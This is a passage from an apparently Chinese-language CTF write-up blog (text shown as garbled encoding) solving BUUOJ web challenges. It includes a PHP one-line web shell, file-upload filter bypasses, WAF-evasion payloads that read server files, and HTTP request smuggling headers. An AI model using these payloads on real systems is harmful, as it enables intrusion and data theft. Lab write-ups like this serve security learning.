<p>è¿”å›çš„åŒ…æç¤ºä¸è¡Œï¼Œé‚£ä¹ˆéœ€è¦ä¿®æ”¹æµè§ˆå™¨åç§°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418007.png" alt="image-20220111141837951"></p>

        <h3 id="2-ä¿®æ”¹User-Agent"   >
          <a href="#2-ä¿®æ”¹User-Agent" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä¿®æ”¹User-Agent" class="headerlink" title="(2)ä¿®æ”¹User-Agent"></a>(2)ä¿®æ”¹User-Agent</h3>
      <p>ä¿®æ”¹å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Syclover</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420138.png" alt="image-20220111142004093"></p>
<p>è¿˜æ˜¯ä¸è¡Œï¼Œæç¤ºéœ€è¦ä»æœ¬åœ°localè¯»å–</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420811.png" alt="image-20220111142051767"></p>

        <h3 id="3-ä¿®æ”¹X-Forwarded-For"   >
          <a href="#3-ä¿®æ”¹X-Forwarded-For" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ä¿®æ”¹X-Forwarded-For" class="headerlink" title="(3)ä¿®æ”¹X-Forwarded-For"></a>(3)ä¿®æ”¹X-Forwarded-For</h3>
      <p>æ·»åŠ å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422737.png" alt="image-20220111142201689"></p>
<p>å‘é€åå¾—åˆ°flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422352.png" alt="image-20220111142221310"></p>

        <h1 id="åä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Upload"   >
          <a href="#åä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#åä¸‰ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="åä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>åä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h1>
      
        <h2 id="ğŸ”ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€ä¸€å¥è¯æœ¨é©¬"   >
          <a href="#ğŸ”ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€ä¸€å¥è¯æœ¨é©¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ğŸ”ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€ä¸€å¥è¯æœ¨é©¬"></a>ğŸ”ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€ä¸€å¥è¯æœ¨é©¬</h2>
      
        <h2 id="1-å‰æœŸæ¢ç´¢-3"   >
          <a href="#1-å‰æœŸæ¢ç´¢-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰æœŸæ¢ç´¢-3" class="headerlink" title="1.å‰æœŸæ¢ç´¢"></a>1.å‰æœŸæ¢ç´¢</h2>
      <p>è¿›å…¥ä¹‹åå‘ç°è®©é€‰æ‹©å›¾ç‰‡è¿›è¡Œä¸Šä¼ ï¼Œé‚£ä¹ˆå°±è€ƒè™‘ä¸€å¥è¯æœ¨é©¬çš„éšå†™ï¼Œç„¶åå†ä¸Šä¼ </p>
<p>é¦–å…ˆå°è¯•ä¸Šä¼ .phpæ–‡ä»¶ï¼Œå¤±è´¥ï¼Œæ¥ç€è€ƒè™‘æµ‹ç»•è¿‡ã€‚</p>

        <h2 id="2-ç»•è¿‡è¿‡æ»¤-1"   >
          <a href="#2-ç»•è¿‡è¿‡æ»¤-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç»•è¿‡è¿‡æ»¤-1" class="headerlink" title="2.ç»•è¿‡è¿‡æ»¤"></a>2.ç»•è¿‡è¿‡æ»¤</h2>
      
        <h3 id="1-ä¿®æ”¹Content-Type"   >
          <a href="#1-ä¿®æ”¹Content-Type" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¿®æ”¹Content-Type" class="headerlink" title="(1)ä¿®æ”¹Content-Type"></a>(1)ä¿®æ”¹Content-Type</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202373.png" alt="image-20220112120212319"></p>
<p>å¤±è´¥ï¼Œåç¼€åä¸èƒ½ä¸º.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202287.png" alt="image-20220112120239252"></p>

        <h3 id="2-ä¿®æ”¹åç¼€å"   >
          <a href="#2-ä¿®æ”¹åç¼€å" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä¿®æ”¹åç¼€å" class="headerlink" title="(2)ä¿®æ”¹åç¼€å"></a>(2)ä¿®æ”¹åç¼€å</h3>
      <p>ä¿®æ”¹ä¸ºphtmlï¼Œè¿™ç§æ ¼å¼åœ¨æœåŠ¡å™¨ä¹Ÿä¼šè¢«ä½œä¸ºphpæ–‡ä»¶è§£æã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121204190.png" alt="image-20220112120451143"></p>
<p>æˆåŠŸï¼Œä½†æ˜¯ä¸èƒ½æ˜¯<code>&lt;?</code>å¼€å¤´ï¼Œé‚£ä¹ˆå°è¯•ä½¿ç”¨htmlæ ¼å¼ã€‚è¿˜æœ‰çš„phpæ–‡ä»¶åç¼€åå¯ä»¥ä¿®æ”¹å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- åˆ©ç”¨ä¸­é—´ä»¶è§£ææ¼æ´ç»•è¿‡æ£€æŸ¥ï¼Œå®æˆ˜å¸¸ç”¨</span><br><span class="line">- ä¸Šä¼ .user.iniæˆ–.htaccesså°†åˆæ³•æ‹“å±•åæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æ</span><br><span class="line">- %00æˆªæ–­ç»•è¿‡</span><br><span class="line">- php3æ–‡ä»¶</span><br><span class="line">- php4æ–‡ä»¶</span><br><span class="line">- php5æ–‡ä»¶</span><br><span class="line">- php7æ–‡ä»¶</span><br><span class="line">- phtmlæ–‡ä»¶</span><br><span class="line">- phpsæ–‡ä»¶</span><br><span class="line">- phtæ–‡ä»¶</span><br></pre></td></tr></table></div></figure>

<p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12403922.html" >BUUOJè®°å½•] [ACTF2020 æ–°ç”Ÿèµ›]Upload - Yeâ€™sBlog - åšå®¢å›­ (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="3-ä¿®æ”¹phpæ ¼å¼"   >
          <a href="#3-ä¿®æ”¹phpæ ¼å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ä¿®æ”¹phpæ ¼å¼" class="headerlink" title="(3)ä¿®æ”¹phpæ ¼å¼"></a>(3)ä¿®æ”¹phpæ ¼å¼</h3>
      <p>ä¿®æ”¹å†…å®¹ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121206053.png" alt="image-20220112120616999"></p>
<p>æˆåŠŸï¼Œä½†æ˜¯ä¹Ÿè¢«æ¢æµ‹åˆ°ï¼Œé‚£ä¹ˆå°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨æ ¼å¼</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121207056.png" alt="image-20220112120712009"></p>

        <h3 id="4-å°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨"   >
          <a href="#4-å°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-å°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨" class="headerlink" title="(4)å°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨"></a>(4)å°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨</h3>
      <p>åœ¨æ–‡ä»¶å¤´åŠ ä¸Š<code>GIF89a</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210799.png" alt="image-20220112121007758"></p>
<p>ä¸Šä¼ æˆåŠŸ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210905.png" alt="image-20220112121056862"></p>

        <h2 id="3-æŸ¥æ‰¾ä¸Šä¼ æ–‡ä»¶è·¯å¾„"   >
          <a href="#3-æŸ¥æ‰¾ä¸Šä¼ æ–‡ä»¶è·¯å¾„" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æŸ¥æ‰¾ä¸Šä¼ æ–‡ä»¶è·¯å¾„" class="headerlink" title="3.æŸ¥æ‰¾ä¸Šä¼ æ–‡ä»¶è·¯å¾„"></a>3.æŸ¥æ‰¾ä¸Šä¼ æ–‡ä»¶è·¯å¾„</h2>
      <p>ä¸€èˆ¬è€Œè¨€ï¼Œä¸Šä¼ çš„éƒ½åœ¨uploadï¼ŒæˆåŠŸæ‰¾åˆ°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121213219.png" alt="image-20220112121305153"></p>
<p>é‚£ä¹ˆèšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121218740.png" alt="image-20220112121815697"></p>

        <h1 id="åå››ã€-ACTF2020-æ–°ç”Ÿèµ›-Upload"   >
          <a href="#åå››ã€-ACTF2020-æ–°ç”Ÿèµ›-Upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#åå››ã€-ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="åå››ã€[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>åå››ã€[ACTF2020 æ–°ç”Ÿèµ›]Upload</h1>
      <p>å’Œåä¸‰é¢˜ä¸€æ ·ï¼Œç›´æ¥ä¸€å¥è¯æœ¨é©¬ï¼Œæ–‡ä»¶æ ¼å¼ä¸ºphtmlï¼Œä¿®æ”¹content-typeå³å¯ï¼Œç„¶åèšå‰‘è¿ä¸Šåœ¨æ ¹ç›®å½•ä¸‹æ‰¾flagã€‚éœ€è¦æ³¨æ„çš„æ˜¯è¦å…ˆä¸Šä¼ æˆåŠŸä¸€ä¸ªæ–‡ä»¶æ‰ä¼šæŠ“åˆ°ä¸Šä¼ çš„åŒ…ï¼Œå› ä¸ºè¿™é‡Œçš„éªŒè¯æ˜¯åœ¨å‰ç«¯éªŒè¯åç¼€åçš„ã€‚</p>

        <h1 id="åäº”ã€-RoarCTF-2019-Easy-Calc"   >
          <a href="#åäº”ã€-RoarCTF-2019-Easy-Calc" class="heading-link"><i class="fas fa-link"></i></a><a href="#åäº”ã€-RoarCTF-2019-Easy-Calc" class="headerlink" title="åäº”ã€[RoarCTF 2019]Easy Calc"></a>åäº”ã€[RoarCTF 2019]Easy Calc</h1>
      
        <h2 id="ğŸ”ºå‘½ä»¤æ‰§è¡Œã€phpå­—ç¬¦ä¸²è§£æã€HTTPèµ°ç§æ”»å‡»"   >
          <a href="#ğŸ”ºå‘½ä»¤æ‰§è¡Œã€phpå­—ç¬¦ä¸²è§£æã€HTTPèµ°ç§æ”»å‡»" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºå‘½ä»¤æ‰§è¡Œã€phpå­—ç¬¦ä¸²è§£æã€HTTPèµ°ç§æ”»å‡»" class="headerlink" title="ğŸ”ºå‘½ä»¤æ‰§è¡Œã€phpå­—ç¬¦ä¸²è§£æã€HTTPèµ°ç§æ”»å‡»"></a>ğŸ”ºå‘½ä»¤æ‰§è¡Œã€phpå­—ç¬¦ä¸²è§£æã€HTTPèµ°ç§æ”»å‡»</h2>
      
        <h2 id="1-å‰æœŸæ¢ç´¢-4"   >
          <a href="#1-å‰æœŸæ¢ç´¢-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰æœŸæ¢ç´¢-4" class="headerlink" title="1.å‰æœŸæ¢ç´¢"></a>1.å‰æœŸæ¢ç´¢</h2>
      <p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°å¦‚ä¸‹.phpæ–‡ä»¶</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121906058.png" alt="image-20220112190657868"></p>
<p>è®¿é—®ä¸€ä¸‹ï¼Œå‘ç°æºä»£ç ï¼Œåˆ†æè¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œç„¶åæˆ‘ä»¬è¾“å…¥çš„numå­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œå¹¶ä¸”ä½¿ç”¨evalæ‰§è¡Œåè¾“å‡º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121912749.png" alt="image-20220112191231694"></p>
<p>ä¸»è¦ä»¥ä¸‹ä»£ç ï¼Œè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œç„¶åæ‰§è¡Œè¾“å‡º</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>

<p>å°è¯•phpinfo()ï¼Œå‘ç°ç›´æ¥æŠ¥é”™ï¼Œå¤§ä½¬ä»¬è¯´æ˜¯Wafçš„åŸå› ï¼Œå…·ä½“ä¹Ÿä¸å¤ªçŸ¥é“æ€ä¹ˆåˆ¤æ–­å‡ºWafçš„ï¼Œç»è¿‡æµ‹è¯•ï¼Œè¿™é‡Œçš„wafä¼šè¿‡æ»¤æ‰æ‰€æœ‰å¸¦å­—æ¯çš„numå˜é‡å†…å®¹ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131203691.png" alt="image-20220113115855930"></p>
<p>æ‰€ä»¥å¤§æ¦‚æœ‰ä¸¤ç§æ–¹æ³•</p>

        <h2 id="2-è§£å†³æ–¹æ³•"   >
          <a href="#2-è§£å†³æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è§£å†³æ–¹æ³•" class="headerlink" title="2.è§£å†³æ–¹æ³•"></a>2.è§£å†³æ–¹æ³•</h2>
      
        <h3 id="è§£æ³•ä¸€ï¼šåˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF"   >
          <a href="#è§£æ³•ä¸€ï¼šåˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ³•ä¸€ï¼šåˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF" class="headerlink" title="è§£æ³•ä¸€ï¼šåˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF"></a>è§£æ³•ä¸€ï¼šåˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF</h3>
      
        <h4 id="1-ç»•è¿‡WAF"   >
          <a href="#1-ç»•è¿‡WAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ç»•è¿‡WAF" class="headerlink" title="(1)ç»•è¿‡WAF"></a>(1)ç»•è¿‡WAF</h4>
      <p>åˆ©ç”¨phpè§£æå­—ç¬¦ä¸²æ—¶ï¼Œä¼šè‡ªåŠ¨å»æ‰å¤šä½™çš„ç©ºæ ¼è¿™ä¸ªç‰¹æ€§ï¼Œå³å½“æˆ‘ä»¬è°ƒè¯•æ—¶</p>
<p>è¾“å…¥ä¸­é—´åŠ å…¥äº†ç©ºæ ¼çš„numï¼Œå‘ç°phpä¾ç„¶èƒ½å¤ŸæˆåŠŸè§£æå‡ºnumè¿™ä¸ªå˜é‡</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?%20num=phpinfo()</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156038.png" alt="image-20220113115626996"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156886.png" alt="image-20220113115655830"></p>
<p>ä½†æ˜¯WAFå¯ä¸ä¼šç®¡ç©ºä¸ç©ºæ ¼çš„ï¼Œå¯¹äºWafæ¥è¯´ï¼Œä¼ è¿‡å»çš„æ˜¯å¸¦äº†ç©ºæ ¼çš„numå˜é‡ï¼Œä¸æ˜¯numå˜é‡ï¼Œæ‰€ä»¥ä¸ä¼šè¿›è¡Œè¿‡æ»¤ï¼Œä¼šå°†å¸¦äº†ç©ºæ ¼çš„numå˜é‡ä¼ é€’ç»™calc.phpæ–‡ä»¶è¿›è¡Œè§£æï¼Œè¿™æ ·å°±æˆåŠŸç»•è¿‡äº†WAFã€‚</p>

        <h4 id="2-ç»•è¿‡è¿‡æ»¤-2"   >
          <a href="#2-ç»•è¿‡è¿‡æ»¤-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç»•è¿‡è¿‡æ»¤-2" class="headerlink" title="(2)ç»•è¿‡è¿‡æ»¤"></a>(2)ç»•è¿‡è¿‡æ»¤</h4>
      <p>ç”±äºè¿‡æ»¤äº†<code>/</code>ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨<code>chr(47)</code>æ¥è¿›è¡Œç»•è¿‡ï¼Œè¿™æ˜¯<code>/</code>å­—ç¬¦çš„asciiç </p>
<p>å…ˆæŸ¥çœ‹æ ¹ç›®å½•ä¸‹æœ‰ä»€ä¹ˆå†…å®¹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%20num=var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></div></figure>

<p>å‘ç°æœ‰flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131211277.png" alt="image-20220113121152229"></p>
<p>é‚£ä¹ˆåˆ©ç”¨phpä¸­çš„å‡½æ•°è¿›è¡Œè·å–</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></div></figure>

<p>å¾—åˆ°flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131212797.png" alt="image-20220113121256750"></p>

        <h3 id="è§£æ³•äºŒï¼šåˆ©ç”¨HTTPèµ°ç§æ”»å‡»"   >
          <a href="#è§£æ³•äºŒï¼šåˆ©ç”¨HTTPèµ°ç§æ”»å‡»" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ³•äºŒï¼šåˆ©ç”¨HTTPèµ°ç§æ”»å‡»" class="headerlink" title="è§£æ³•äºŒï¼šåˆ©ç”¨HTTPèµ°ç§æ”»å‡»"></a>è§£æ³•äºŒï¼šåˆ©ç”¨HTTPèµ°ç§æ”»å‡»</h3>
      <p>è¿™ä¸ªå…·ä½“çš„åŸç†å®åœ¨æ˜¯æœ‰ç‚¹ä¸å¤ªèƒ½ç†è§£ï¼Œå¯èƒ½éœ€è¦æ·±å…¥ç ”ç©¶ä¸€ä¸‹ã€‚ä»¥æˆ‘çš„ç†è§£æ¥è¯´ï¼Œå°±æ˜¯é€šè¿‡ä¿®æ”¹<code>content-length</code>æˆ–è€…<code>Transfer-Encoding</code>ï¼Œæ¥ä½¿å¾—æ•°æ®åŒ…åœ¨å‰åç«¯è§£æçš„è¿‡ç¨‹ä¸­ï¼Œè®©å‰ç«¯ä»¥ä¸ºè¯¥æ•°æ®åŒ…çš„å†…å®¹æ¯”è¾ƒå°‘ï¼Œä½¿å…¶è®¤ä¸ºä¸åŒ…å«éœ€è¦è¿‡æ»¤çš„å†…å®¹ï¼Œä»è€ŒæŠŠå®Œæ•´çš„æ•°æ®åŒ…å‘ç»™åç«¯ï¼Œç»•è¿‡å‰ç«¯çš„Wafç­‰è¿‡æ»¤ã€‚</p>
<p>BurpSuitæŠ“åŒ…ä¹‹åï¼Œä¿®æ”¹<code>content-length</code>æˆ–è€…<code>Transfer-Encoding</code></p>

        <h4 id="1-åˆ©ç”¨CL-CL"   >
          <a href="#1-åˆ©ç”¨CL-CL" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆ©ç”¨CL-CL" class="headerlink" title="(1)åˆ©ç”¨CL-CL"></a>(1)åˆ©ç”¨CL-CL</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131507999.png" alt="image-20220113150704935"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 0</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></div></figure>


        <h4 id="2-åˆ©ç”¨CL-TE"   >
          <a href="#2-åˆ©ç”¨CL-TE" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åˆ©ç”¨CL-TE" class="headerlink" title="(2)åˆ©ç”¨CL-TE"></a>(2)åˆ©ç”¨CL-TE</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131518370.png" alt="image-20220113151848304"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 3</span><br></pre></td></tr></table></div></figure>

<p>æœ‰æ—¶å€™åˆå¾ˆå¥‡æ€ªï¼Œå°±ç¦»è°±ã€‚</p>
<p>åŒæ—¶GETæ”¹æˆPOSTä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p>
<p>åé¢éƒ½ä¸€æ ·äº†ï¼Œå°±æ˜¯ç»•è¿‡åç«¯çš„è¿‡æ»¤ã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html" >4.17. HTTP è¯·æ±‚èµ°ç§ â€” Webå®‰å…¨å­¦ä¹ ç¬”è®° 1.0 æ–‡æ¡£ (websec.readthedocs.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="åå…­ã€-æå®¢å¤§æŒ‘æˆ˜-2019-PHP"   >
          <a href="#åå…­ã€-æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#åå…­ã€-æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="åå…­ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>åå…­ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h1>
      
        <h2 id="ğŸ”ºPHPååºåˆ—åŒ–"   >
          <a href="#ğŸ”ºPHPååºåˆ—åŒ–" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºPHPååºåˆ—åŒ–" class="headerlink" title="ğŸ”ºPHPååºåˆ—åŒ–"></a>ğŸ”ºPHPååºåˆ—åŒ–</h2>
      
        <h2 id="1-åˆ†æ"   >
          <a href="#1-åˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆ†æ" class="headerlink" title="1.åˆ†æ"></a>1.åˆ†æ</h2>
      <p><code>dirsearch</code>æ‰«æå‘ç°<code>www.zip</code>ï¼Œè¯¥æ–‡ä»¶ä¸ºç½‘å€å¤‡ä»½æ–‡ä»¶ï¼Œå¯ä»¥ä¸‹è½½ä¸‹æ¥ï¼Œå…¶ä¸­ä¸º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220710161845497.png" alt="image-20220710161845497"></p>
<p>ä¹‹åçœ‹<code>index.php</code>ä¸­æœ‰å¦‚ä¸‹ä»£ç </p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220710161859892.png" alt="image-20220710161859892"></p>
<p>å†è½¬åˆ°<code>class.php</code></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span 